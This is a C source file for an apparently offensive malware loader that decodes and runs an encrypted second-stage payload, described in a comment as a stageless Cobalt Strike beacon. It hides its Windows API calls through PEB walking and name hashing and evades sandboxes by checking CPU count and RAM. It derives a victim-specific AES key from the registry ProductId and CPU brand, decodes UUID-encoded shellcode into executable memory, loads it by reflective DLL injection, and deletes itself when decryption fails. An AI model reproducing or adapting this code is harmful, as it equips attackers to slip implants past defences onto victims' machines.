#include "newstage1.h"
#pragma comment(lib, "librpcrt4.a")

#define stage2size 371712//CS stageless padded w/ enough bytes to round out uuid length //287744
#define uuid_size stage2size / 16 * 36

unsigned char uuids[uuid_size] =  "DDDDDDDD";

//KERNEL32 API'S
PGetCurrentProcess fpGetCurrentProcess = NULL;
PGetCurrentProcessId fpGetCurrentProcessId = NULL;
POpenProcess fpOpenProcess = NULL;
PGetSystemInfo fpGetSystemInfo = NULL;
PGetNativeSystemInfo fpGetNativeSystemInfo = NULL;
PGlobalMemoryStatusEx fpGlobalMemoryStatusEx = NULL;
PLoadLibraryA fpLoadLibraryA = NULL;
PGetModuleFileNameW fpGetModuleFileNameW = NULL;
PCreateFileW fpCreateFileW = NULL;
PSetFileInformationByHandle fpSetFileInformationByHandle = NULL;
PHeapCreate	fpHeapCreate = NULL;
PHeapAlloc	fpHeapAlloc = NULL;
PHeapFree	fpHeapFree = NULL;
PWaitForSingleObject	fpWaitForSingleObject = NULL;
PVirtualProtect	fpVirtualProtect = NULL;
PVirtualAllocEx	fpVirtualAllocEx = NULL;
PWriteProcessMemory	fpWriteProcessMemory = NULL;
PCreateRemoteThread	fpCreateRemoteThread = NULL;
PCloseHandle	fpCloseHandle = NULL;

PVOID K32BaseAddr = 0;

unsigned int hash(const char* str)
{
	unsigned int hash = 2167;
	int c;
	while (c = *str++)
		hash = ((hash << 5) + hash) + c;
	return hash;
}

VOID PopulateK32()
{

    K32BaseAddr = GetDLLAddr(0xeebd1469);//C:\WINDOWS\SYSTEM32\KERNEL32.DLL //syswow64 
    if(K32BaseAddr == 0)
    {
        K32BaseAddr = GetDLLAddr(0x8d8da2ad); //system32
    }
    //Set up structures to be able to resolve address of each function within KERNEL32
    PIMAGE_DOS_HEADER pDosH = (PIMAGE_DOS_HEADER)K32BaseAddr;
    PIMAGE_NT_HEADERS pNtH = (PIMAGE_NT_HEADERS)((PBYTE)K32BaseAddr + pDosH->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOpH = (PIMAGE_OPTIONAL_HEADER) & (pNtH->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)K32BaseAddr + pOpH->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)K32BaseAddr + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)K32BaseAddr + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)K32BaseAddr + pExportDirectory->AddressOfNameOrdinals);

    for (int i = 0; i < pExportDirectory->NumberOfNames; i++) {
        PCSTR pFunctionName = (PSTR)((PBYTE)K32BaseAddr + pAddressOfNames[i]);
        if (hash(pFunctionName) == 0x8fd71ee6) {
            fpGetCurrentProcessId = (PGetCurrentProcessId)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0xb0acfad9) {
            fpGetCurrentProcess = (PGetCurrentProcess)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xa9127239) {
            fpCloseHandle = (PCloseHandle)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xe1d8a608) {
            fpOpenProcess = (POpenProcess)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xa2b56ca8) {
            fpGetSystemInfo = (PGetSystemInfo)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x257582cf) {
            fpGetNativeSystemInfo = (PGetNativeSystemInfo)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x53c11262) {
            fpGlobalMemoryStatusEx = (PGlobalMemoryStatusEx)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xe4969f6d) {
            fpLoadLibraryA = (PLoadLibraryA)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xbdc8dd55) {
            fpGetModuleFileNameW = (PGetModuleFileNameW)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x5c386e42) {
            fpCreateFileW = (PCreateFileW)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x805f52f0) {
            fpSetFileInformationByHandle = (PSetFileInformationByHandle)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0x998c047f) {
            fpVirtualProtect = (PVirtualProtect)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0x8aa6da6) {
            fpVirtualAllocEx = (PVirtualAllocEx)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0x5440b34f) {
            fpCreateRemoteThread = (PCreateRemoteThread)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0xd8e55bec) {
            fpWaitForSingleObject = (PWaitForSingleObject)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
		if (hash(pFunctionName) == 0x193324ba) {
            fpWriteProcessMemory = (PWriteProcessMemory)((PBYTE)K32BaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }
}

PVOID GetDLLAddr(unsigned int dllhash) 
{
    #if defined(__x86_64__)// If compiling as x64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    #endif
    #if defined(__i386__)// If compiling as x86
    PPEB pPEB = (PPEB)__readfsdword(0x30);
    #endif
    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
    PLIST_ENTRY listCurrent = listHead->Flink;
    PVOID DLLAddress = NULL;
    do
    {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
        PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
        CharUpperA(dllName);
        if (hash(dllName) == dllhash) //If hashed DLL matches hash passed via function arg
        {
            DLLAddress = dllEntry->DllBase;
            HeapFree(GetProcessHeap(), 0, dllName);
            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);
        listCurrent = listCurrent->Flink;
    } while (listCurrent != listHead);
    return DLLAddress;
}

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }

FARPROC WINAPI GetProcAddressR( HANDLE hModule, LPCSTR lpProcName )
{
	UINT_PTR uiLibraryAddress = 0;
	FARPROC fpResult          = NULL;

	if( hModule == NULL )
		return NULL;

	// a module handle is really its base address
	uiLibraryAddress = (UINT_PTR)hModule;

	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameArray    = 0;
	UINT_PTR uiNameOrdinals = 0;
	PIMAGE_NT_HEADERS pNtHeaders             = NULL;
	PIMAGE_DATA_DIRECTORY pDataDirectory     = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
		
	// get the VA of the modules NT Header
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

	pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// get the VA of the export directory
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)( uiLibraryAddress + pDataDirectory->VirtualAddress );
		
	// get the VA for the array of addresses
	uiAddressArray = ( uiLibraryAddress + pExportDirectory->AddressOfFunctions );

	// get the VA for the array of name pointers
	uiNameArray = ( uiLibraryAddress + pExportDirectory->AddressOfNames );
			
	// get the VA for the array of name ordinals
	uiNameOrdinals = ( uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals );

	// test if we are importing by name or by ordinal...
	if( ((DWORD)lpProcName & 0xFFFF0000 ) == 0x00000000 )
	{
		// import by ordinal...

		// use the import ordinal (- export ordinal base) as an index into the array of addresses
		uiAddressArray += ( ( IMAGE_ORDINAL( (DWORD)lpProcName ) - pExportDirectory->Base ) * sizeof(DWORD) );

		// resolve the address for this imported function
		fpResult = (FARPROC)( uiLibraryAddress + DEREF_32(uiAddressArray) );
	}
	else
	{
		// import by name...
		DWORD dwCounter = pExportDirectory->NumberOfNames;
		while( dwCounter-- )
		{
			char * cpExportedFunctionName = (char *)(uiLibraryAddress + DEREF_32( uiNameArray ));
			
			// test if we have a match...
			if( strcmp( cpExportedFunctionName, lpProcName ) == 0 )
			{
				// use the functions name ordinal as an index into the array of name pointers
				uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
				
				// calculate the virtual address for the function
				fpResult = (FARPROC)(uiLibraryAddress + DEREF_32( uiAddressArray ));
				
				// finish...
				break;
			}
					
			// get the next exported function name
			uiNameArray += sizeof(DWORD);

			// get the next exported function name ordinal
			uiNameOrdinals += sizeof(WORD);
		}
	}


	return fpResult;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{    
	WORD wIndex                          = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders         = NULL;
	
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for( wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++ )
    {   
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )           
           return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }
    
    return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
	UINT_PTR uiBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0;
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;

#if defined(__x86_64__)// If compiling as x64
	DWORD dwCompiledArch = 2;
#else	
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has  
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
	{
		if( dwCompiledArch != 1 )
			return 0;
	}
	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
	{
		if( dwCompiledArch != 2 )
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );	

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while( dwCounter-- )
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

		if( strstr( cpExportedFunctionName, "ReflectiveLoader" ) != NULL )
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );	
	
			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadLibraryR( LPVOID lpBuffer, DWORD dwLength )
{
	HMODULE hResult                    = NULL;
	DWORD dwReflectiveLoaderOffset     = 0;
	DWORD dwOldProtect1                = 0;
	DWORD dwOldProtect2                = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain                   = NULL;

	if( lpBuffer == NULL || dwLength == 0 )
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
	if( dwReflectiveLoaderOffset != 0 )
	{
		pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

		// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
		// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
		if( fpVirtualProtect( lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1 ) )
		{
			// call the librarys ReflectiveLoader...
			pDllMain = (DLLMAIN)pReflectiveLoader();
			if( pDllMain != NULL )
			{
				// call the loaded librarys DllMain to get its HMODULE
				if( !pDllMain( NULL, DLL_QUERY_HMODULE, &hResult ) )	
					hResult = NULL;
			}
			// revert to the previous protection flags...
			fpVirtualProtect( lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2 );
		}
	}
	else
		hResult = NULL;

	return hResult;
}
//===============================================================================================//
// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
//       defined in order to use the correct RDI prototypes.
// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
// Note: This function currently cant inject accross architectures, but only to architectures which are the 
//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
{
	BOOL bSuccess                             = FALSE;
	LPVOID lpRemoteLibraryBuffer              = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread                            = NULL;
	DWORD dwReflectiveLoaderOffset            = 0;
	DWORD dwThreadId                          = 0;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = fpVirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 

	// write the image into the host process...
	fpWriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL );
	
	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

	// create a remote thread in the host process to call the ReflectiveLoader!
	hThread = fpCreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId );

	return hThread;
}

BOOL Evade()
{
	SYSTEM_INFO systemInfo;
	fpGetSystemInfo(&systemInfo);
	if (systemInfo.dwNumberOfProcessors < 2)
	{
		return FALSE;
	}
	//Check amount of RAM for sandbox evasion
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	fpGlobalMemoryStatusEx(&memoryStatus);
	if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
	{
		return FALSE;
	}
	return TRUE;
}

void deleteme()
{
	WCHAR wcPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcPath, sizeof(wcPath));

	// get the path to the current running process ctx
	fpGetModuleFileNameW(NULL, wcPath, MAX_PATH);

	HANDLE hCurrent = fpCreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// rename the associated HANDLE's file name
	FILE_RENAME_INFO* fRename;
	LPWSTR lpwStream = L":gone";
	DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

	DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
	fRename = (FILE_RENAME_INFO*)malloc(bsfRename);
	memset(fRename, 0, bsfRename);
	fRename->FileNameLength = bslpwStream;
	memcpy(fRename->FileName, lpwStream, bslpwStream);
	//printf("bsfRename: %d; FileNameLength: %d; FileName: %ls\n", bsfRename, fRename->FileNameLength, fRename->FileName);
	fpSetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
	fpCloseHandle(hCurrent);

	// open another handle, trigger deletion on close
	hCurrent = fpCreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// set FILE_DISPOSITION_INFO::DeleteFile to TRUE
	FILE_DISPOSITION_INFO fDelete;
	RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
	fDelete.DeleteFile = TRUE;
	fpSetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

	// trigger the deletion deposition on hCurrent
	fpCloseHandle(hCurrent);
}

void GetKeyBase(char aeskey[], char iv[])
{
	//Get Processor Name
	int cpuInfo[4] = { -1 };
	char CPUBrandString[0x40];
	memset(CPUBrandString, 0, sizeof(CPUBrandString));
	__cpuid(cpuInfo, 0x80000002);
	memcpy(CPUBrandString, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000003);
	memcpy(CPUBrandString + 16, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000004);
	memcpy(CPUBrandString + 32, cpuInfo, sizeof(cpuInfo));

	int AccessMask;
	SYSTEM_INFO systemInfo;
	fpGetNativeSystemInfo(&systemInfo);
	//If we are on x86 machine
	if (systemInfo.wProcessorArchitecture == 0)
	{
		AccessMask = KEY_QUERY_VALUE;
	}
	//Otherwise we are on x64
	else
	{
		fpGetSystemInfo(&systemInfo);
		//If process is x86
		if (systemInfo.wProcessorArchitecture == 0)
		{
			AccessMask = KEY_QUERY_VALUE | KEY_WOW64_64KEY;
		}
		//Otherwise x64
		else
		{
			AccessMask = KEY_QUERY_VALUE;
		}
	}
	char subkey[] = { 'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r','o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\0' };
	char regval[] = { 'P', 'r', 'o', 'd', 'u', 'c', 't', 'I', 'd', '\0' };
	char value[255];
	char shash[16];
	char assembleiv[17];
	int i;
	HKEY key = NULL;
	DWORD BufferSize = 255;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, AccessMask, &key);
	RegGetValueA(key, "", regval, RRF_RT_ANY, NULL, &value, &BufferSize);
	RegCloseKey(key);
	strcat(value, CPUBrandString);
	sprintf(shash, "%u", hash(value));

	int keylen = strlen(shash);
	int remainder = 16 - keylen;

	//Assemble IV
	strncpy(assembleiv, shash, keylen);
	for (i = 0; i < remainder; i++)
	{
		assembleiv[keylen + i] = '0';
	}
	assembleiv[keylen + remainder] = '\0';
	sprintf(iv, "%s", strrev(assembleiv));

	//Assemble Key
	strncpy(aeskey, shash, keylen);
}


int main( int argc, char * argv[] )
{
	//Populate K32 api's
	PopulateK32();
	
	//Sandbox evasion
	if(!Evade())
		return 0;
	
	//Initialize vars
	unsigned char* rawshellcode;
	long rawsclen;
	char iv[16];
	char aeskey[] = {'0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'};

	//Gather victim info and create AES key and iv
	GetKeyBase(aeskey, iv);

	//Allocate memory
	unsigned char* ha = fpVirtualAllocEx( fpGetCurrentProcess(), NULL, stage2size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
	DWORD_PTR hptr = (DWORD_PTR)ha;

	//Calculate number of uuids that stage2 comprises
	int elems = sizeof(uuids) / 36;

	//Initialize vars
	int count;
	int place = 0;
	char temp[37];

	//Transform stage2 string into uuids and then use UuidFromStringA in order to turn into binary and store in allocated heap memory
	for (int i = 0; i < elems; i++) {
		for (count = 0; count < 36; count++)
		{
			memcpy(temp + count, uuids + place + count, 1);

		}
		//Null terminate temp string
		memcpy(temp + 36, "\0x00", 1);
		//increment uuid buffer location
		place = place + 36;
		//Convert UUID in temp to binary
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)temp, (UUID*)hptr);
		//Increment heap buffer
		hptr += 16;
	}

	//AES Decrypt shellcode using victim specific AES key and iv
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, aeskey, iv);
	AES_CTR_xcrypt_buffer(&ctx, ha, stage2size);

	//Check for magic bytes in decrypted stage2; if not MZ, decryption failed and stage1 will delete itself.
	if (*ha != 0x4d || *(ha+1) != 0x5a)
	{
		printf("failed magic byte check!");
		deleteme();
		return 0;
	}

	//Reflective Loader. Run stage2 reflective DLL. 
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	TOKEN_PRIVILEGES priv = {0};
	do
	{
		hProcess = fpOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, GetCurrentProcessId() );
		if( !hProcess )
			BREAK_WITH_ERROR( "Failed to open the target process" );
		hModule = LoadRemoteLibraryR( hProcess, ha, stage2size, NULL );
		if( !hModule )
		{
			BREAK_WITH_ERROR( "Failed to inject the DLL" );
		}
		else
			printf( "[+] Injected!");
		
		fpWaitForSingleObject( hModule, -1 );
	} while( 0 );

	if( hProcess )
		fpCloseHandle( hProcess );
	return 0;
}